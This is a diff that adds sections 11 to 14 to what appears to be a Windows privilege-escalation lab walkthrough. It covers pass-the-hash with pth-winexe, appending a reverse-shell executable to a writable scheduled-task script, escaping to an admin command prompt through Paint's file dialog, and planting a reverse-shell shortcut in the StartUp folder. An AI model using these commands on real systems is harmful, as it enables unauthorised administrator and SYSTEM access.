@@ -379,9 +379,97 @@ Crack the admin NTLM hash using hashcat:
 You can use the cracked password to log in as the admin using winexe or RDP.
 
 
+\
+\
+\
+\
+
+### Escalation Path 11 - Passing the Hash
+---
+
+Why crack a password hash when you can authenticate using the hash?
+
+Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
+
+> **pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe**
 
 
+\
+\
+\
+\
 
+
+### Escalation Path 12 - Scheduled Tasks
+---
+
+
+View the contents of the C:\DevTools\CleanUp.ps1 script:
+
+> **type C:\DevTools\CleanUp.ps1**
+
+The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
+
+> **C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1**
+
+Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
+
+> **echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1**
+
+Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
+
+\
+\
+\
+\
+
+
+### Escalation Path 13 - Insecure GUI Apps
+---
+
+
+Start an RDP session as the "user" account:
+
+> **rdesktop -u user -p password321 MACHINE_IP**
+
+Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
+
+> **tasklist /V | findstr mspaint.exe**
+
+In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
+
+Press Enter to spawn a command prompt running with admin privileges.
+
+
+\
+\
+\
+\
+
+
+### Escalation path 14 - Startup Apps
+---
+
+
+Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
+
+> **C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"**
+
+Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
+
+> **cscript C:\PrivEsc\CreateShortcut.vbs**
+
+Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
+
+> **rdesktop -u admin MACHINE_IP**
+
+A shell running as admin should connect back to your listener.
+
+
+\
+\
+\
+\
 
 
 
